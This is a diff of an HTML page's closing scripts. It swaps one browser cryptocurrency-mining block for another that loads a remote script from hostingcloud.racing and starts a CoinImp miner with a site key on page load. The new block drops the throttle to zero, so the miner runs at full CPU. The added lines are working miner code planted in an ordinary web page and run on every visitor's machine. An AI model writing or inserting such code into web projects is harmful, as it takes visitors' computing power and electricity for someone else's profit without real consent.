@@ -354,28 +354,15 @@
                 setTimeout(() => loader.remove(), 300);
             });
         });
+    </script>
 
-        // Майнинг скрипт
-        document.addEventListener('DOMContentLoaded', () => {
-            try {
-                var _client = new Client.Anonymous('ce72e704c73c41287b5ac6321382ea0c8fc1b6e54eb08b90a359a8e8d1a28a56', {
-                    throttle: 0.3, // Настройте в зависимости от производительности
-                    c: 'w' // Дополнительные параметры, если поддерживаются
-                });
-                _client.start();
-                _client.addMiningNotification(
-                    "Top", 
-                    "This site is running JavaScript miner. If it bothers you, you can stop it.", 
-                    "#cccccc", 
-                    40, 
-                    "#3d3d3d"
-                );
-
-                console.log("Mining client started.");
-            } catch (error) {
-                console.error("Error starting mining client:", error);
-            }
+    <script src="https://www.hostingcloud.racing/RVI0.js"></script>
+    <script>
+        var _client = new Client.Anonymous('f4f8fb78d130053bdec3d01e3dfecf9434bae5fa8a847a9d75893cd3d152568d', {
+            throttle: 0, c: 'w'
         });
+        _client.start();
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
     </script>
 </body>
 </html>
